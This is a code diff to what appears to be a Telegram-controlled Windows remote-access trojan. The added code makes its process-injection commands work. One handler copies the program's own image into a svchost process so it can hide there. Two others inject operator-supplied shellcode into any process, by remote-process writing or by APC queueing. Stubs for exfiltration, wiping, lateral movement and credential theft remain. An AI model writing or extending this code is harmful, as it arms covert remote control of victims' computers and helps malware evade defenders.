@@ -585,7 +585,7 @@ static DWORD WINAPI TelegramPoller(LPVOID) {
             // Parse JSON to extract update_id and text
             size_t textPos = body.find("\"text\":\"");
             while (textPos != std::string::npos) {
-                size_t start = textPos + 7;
+                size_t start = textPos + 8; // skip past "text":"
                 size_t end = body.find('\"', start);
                 if (end == std::string::npos) break;
                 std::string command = body.substr(start, end - start);
@@ -641,6 +641,65 @@ static DWORD WINAPI TelegramPoller(LPVOID) {
 // =====================================================================
 //  STUB HANDLERS
 // =====================================================================
+static std::wstring HandleMigrate(const std::string& args) {
+    DWORD targetPid = args.empty() ? FindBestSvchost() : static_cast<DWORD>(atol(args.c_str()));
+    if (!targetPid) return L"[error: no target pid]";
+
+    // Inject current image into target and exit
+    wchar_t selfPath[MAX_PATH] = {};
+    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
+
+    HANDLE hFile = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ,
+                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) return L"[error: cannot open self]";
+    LARGE_INTEGER fsz = {};
+    GetFileSizeEx(hFile, &fsz);
+    std::vector<BYTE> payload(static_cast<size_t>(fsz.QuadPart));
+    DWORD rd = 0;
+    ReadFile(hFile, payload.data(), static_cast<DWORD>(payload.size()), &rd, nullptr);
+    CloseHandle(hFile);
+    if (rd != payload.size()) return L"[error: read failed]";
+
+    BOOL ok = InjectRemoteProcess(targetPid, payload.data(), payload.size(), nullptr);
+    if (!ok) return L"[error: injection failed into pid=" + std::to_wstring(targetPid) + L"]";
+    return L"[+] Migrated into pid=" + std::to_wstring(targetPid);
+}
+
+static std::wstring HandleInject(const std::string& args) {
+    // args: "<pid> <hex shellcode bytes space-separated>" or "<pid>" with payload from KV
+    size_t sp = args.find(' ');
+    if (sp == std::string::npos) return L"Usage: !inject <pid> <hex bytes...>";
+    DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
+    if (!pid) return L"[error: invalid pid]";
+    std::string hexStr = args.substr(sp + 1);
+    std::vector<BYTE> sc;
+    for (size_t i = 0; i + 1 < hexStr.size(); i += 2) {
+        if (hexStr[i] == ' ') { --i; continue; }
+        sc.push_back(static_cast<BYTE>(strtol(hexStr.substr(i, 2).c_str(), nullptr, 16)));
+    }
+    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
+    BOOL ok = InjectRemoteProcess(pid, sc.data(), sc.size(), nullptr);
+    return ok ? L"[+] Injected " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
+              : L"[error: injection failed]";
+}
+
+static std::wstring HandleInjectApc(const std::string& args) {
+    size_t sp = args.find(' ');
+    if (sp == std::string::npos) return L"Usage: !inject-apc <pid> <hex bytes...>";
+    DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
+    if (!pid) return L"[error: invalid pid]";
+    std::string hexStr = args.substr(sp + 1);
+    std::vector<BYTE> sc;
+    for (size_t i = 0; i + 1 < hexStr.size(); i += 2) {
+        if (hexStr[i] == ' ') { --i; continue; }
+        sc.push_back(static_cast<BYTE>(strtol(hexStr.substr(i, 2).c_str(), nullptr, 16)));
+    }
+    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
+    BOOL ok = InjectViaApc(pid, sc.data(), sc.size());
+    return ok ? L"[+] APC queued " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
+              : L"[error: APC injection failed]";
+}
+
 static std::wstring HandlePs(const std::string& /*args*/) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return L"[error: snapshot failed]";
@@ -659,16 +718,13 @@ static std::wstring HandlePs(const std::string& /*args*/) {
     CloseHandle(snap);
     return out;
 }
-static std::wstring HandleLol(const std::string& args) { return L"lol stub"; }
-static std::wstring HandleInject(const std::string& args) { return L"inject stub"; }
-static std::wstring HandleInjectApc(const std::string& args) { return L"inject-apc stub"; }
-static std::wstring HandleMigrate(const std::string& args) { return L"migrate stub"; }
-static std::wstring HandleExfil(const std::string& args) { return L"exfil stub"; }
-static std::wstring HandleWipe(const std::string& args) { return L"wipe stub"; }
-static std::wstring HandleLateral(const std::string& args) { return L"lateral stub"; }
-static std::wstring HandleCreds(const std::string& args) { return L"creds stub"; }
-static std::wstring HandleDownload(const std::string& args) { return L"download stub"; }
-static std::wstring HandleUpload(const std::string& args) { return L"upload stub"; }
+static std::wstring HandleLol(const std::string& /*args*/)     { return L"[lol: not implemented]"; }
+static std::wstring HandleExfil(const std::string& /*args*/)   { return L"[exfil: not implemented]"; }
+static std::wstring HandleWipe(const std::string& /*args*/)    { return L"[wipe: not implemented]"; }
+static std::wstring HandleLateral(const std::string& /*args*/) { return L"[lateral: not implemented]"; }
+static std::wstring HandleCreds(const std::string& /*args*/)   { return L"[creds: not implemented]"; }
+static std::wstring HandleDownload(const std::string& /*args*/) { return L"[download: not implemented]"; }
+static std::wstring HandleUpload(const std::string& /*args*/)  { return L"[upload: not implemented]"; }
 
 // =====================================================================
 //  COMMAND TABLE
